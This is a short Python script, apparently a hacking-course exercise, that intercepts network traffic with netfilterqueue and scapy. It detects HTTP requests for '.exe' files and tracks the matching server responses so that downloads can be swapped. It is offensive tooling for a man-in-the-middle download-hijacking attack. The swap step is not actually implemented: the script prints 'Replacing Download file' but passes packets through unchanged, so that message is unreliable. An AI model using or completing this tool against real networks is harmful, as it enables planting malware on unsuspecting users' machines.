#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# Created ack list
list_ack = []

def spoofed_packet(packets):
    scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
    if scapy_packet.haslayer(scapy.Raw):
        # Destination Port
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load: # if file contains exe download
                print("[+] exe Request")
                list_ack.append(scapy_packet[scapy.TCP].ack) # store the ack in the list variable
                print(scapy_packet.show())
        # Source Port
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in list_ack: # check if seq to the response in the ack list
                list_ack.remove(scapy_packet[scapy.TCP].seq) # remove seq in the list because we don't want to use it anymore
                print("[+] Replacing Download file")
                print(scapy_packet.show())
    packets.accept()  # accept packets

queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
# the call back function
queue.run() # to run the function